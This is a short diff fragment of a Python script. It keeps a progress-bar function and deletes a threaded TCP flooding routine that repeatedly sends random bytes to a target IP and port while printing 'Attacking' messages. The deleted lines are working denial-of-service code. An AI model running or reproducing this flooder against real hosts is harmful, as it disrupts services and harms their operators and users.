@@ -35,23 +35,3 @@ def animated_marker():
         bar.update(i)
           
 animated_marker()
-
-
-def start():
-  r = random._urandom(10)
-  u = int(0)
-  while True:
-    try:
-      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-      s.connect((ip,port))
-      s.send(r)
-      for i in range(packs):
-        s.send(r)
-        u += 1
-        print("\033[92m[\033[97m+\033[92m]\033[92mSent: " +str(u)+ " \033[94m<-- Attacking " +ip+ " -->" )
-    except:
-      s.close()
-      print("\033[97m[\033[91m-\033[97m]\033[91mFlooding Done!")
-
-for x in range(thread):
-    thred = threading.Thread(target=start)
